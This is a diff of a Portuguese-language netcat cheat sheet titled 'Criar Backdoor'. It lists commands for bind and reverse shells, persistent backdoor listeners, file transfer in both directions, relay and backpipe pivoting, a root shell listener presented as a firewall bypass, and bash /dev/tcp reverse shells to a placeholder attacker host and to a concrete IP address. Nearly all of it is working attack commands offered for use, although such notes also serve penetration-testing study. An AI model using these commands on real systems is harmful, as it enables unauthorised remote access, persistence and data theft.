@@ -3,29 +3,96 @@
 Criar Backdoor
 
 BIND
-Alvo -> nc -v -l -p 123 -e /bin/bash
-Atacante -> nc -v IPDOALVO 123
+	Alvo -> nc -v -l -p 123 -e /bin/bash
+	Atacante -> nc -v IPDOALVO 123
 
 REVERSE
-Atacante -> nc -l -p 123 -vv
-Alvo -> nc.exe IPDOATACANTE 123 -e cmd.exe
+	Atacante -> nc -l -p 123 -vv
+	Alvo -> nc.exe IPDOATACANTE 123 -e cmd.exe
 
-Atacante -> nc -v -l -p 123
-Atacante -> nc -v -l -p 456
-Alvo -> nc.exe IPDOATACANTE 123 | cmd.exe | nc.exe IPDOATACANTE 456
+	Atacante -> nc -v -l -p 123
+	Atacante -> nc -v -l -p 456
+	Alvo -> nc.exe IPDOATACANTE 123 | cmd.exe | nc.exe IPDOATACANTE 456
 
 PERSISTENTE (LINUX)
-Alvo -> while true; do nc -v -l -p 123 -e /bin/bash; done
-Atacante -> nc -vv IPDOALVO 123
+	Alvo -> while true; do nc -v -l -p 123 -e /bin/bash; done
+	Atacante -> nc -vv IPDOALVO 123
 
 VARREDURA DE PORTAS
-nc -v IPDOALVO -z 21-80
+	nc -v IPDOALVO -z 21-80
+	nc -v -w3 -z [targetIp] [startport]-[endport]
 
 LOCALIZAÇÃO DO NETCAT NO KALI LINUX
-/usr/share/windows-binaries/nc.exe
+	/usr/share/windows-binaries/nc.exe
 
 LEITURA DE BANNERS
-nc IPDOALVO PORTA
-GET / HTTP/1.1
-HEAD /
+	nc IPDOALVO PORTA
+		GET / HTTP/1.1
+		HEAD /
 
+
+DOWNLOAD ARQUIVO
+
+	alvo-> nc -l -p [port] < [filename]
+	client-> nc [alvo ip] [port] > [filename]
+
+
+UPLOAD ARQUIVO
+
+	alvo-> nc -l -p [port] > [filename]
+	client-> nc [alvo ip] [port] < [filename]
+
+
+NETCAT PERSISTENTE
+
+	use o -L para manter a porta aberta	
+
+	while [ 1 ]; do echo "Started"; nc -l -p [porta] -e /bin/sh; done
+
+	nohup ./listener.sh &  // nohup mantém o serviço funcionando
+
+NETCAT RELAY NO WINDOWS
+
+	criar script.bat com "nc next_hop 54321"
+	nc -l -p 1111 -e ncrelay.bat
+
+BACKPIPE PARA FULL PIVO NETCAT
+
+	EXECUTAR NO RELAY (PIVO)
+		mknod backpipe p
+		nc -l -p 1111 0<backpipe | nc next_hop 54321 1> backpipe
+		nc -l -p [portadopivor] 0<backpipe | nc [ipdoalvo] [portadoalvo] 1> backpipe
+
+	EXECUTAR NO ALVO
+		nc -l -p 54321 -e /bin/sh
+		nc -l -p [porta] -e [comando a ser executado]
+
+	EXECUTAR NO ATACANTE
+		nc [ip do relay] 1111
+		nc [ip do relay] [porta escuta]
+
+
+MÁQUINA QUE NÃO POSSUI O -e
+	mknod backpipe p
+	/bin/bash 0<backpipe | nc -l -p 8080 1>backpipe
+
+DIRECIONAR PARA SERVIÇO NA PRÓPRIA MÁQUINA
+	ATACANTE ESCUTA
+		nc -l -p 1111
+
+	ALVO ESCUTANDO NO SERVIÇO COMO ROOT
+		sudo nc -l -p 2222 -e /bin/sh
+
+	ALVO CONECTA COM O ATACANTE
+		mknod backpipe p
+		nc IPDOATACANTE 1111 0<backpipe | nc 127.0.0.1 [p] 1>backpipe
+		*conecta com o nc root local e dá a saída para o atacanet (bypass firewall)
+
+
+
+###################################################
+###				RETORNA SHELL INSANO			###
+###################################################
+	
+bash -i >& /dev/tcp/IPDOATACANTE/PORTA_ATACANTE 0>&1
+bash -i >& /dev/tcp/172.16.210.153/443 0>&1
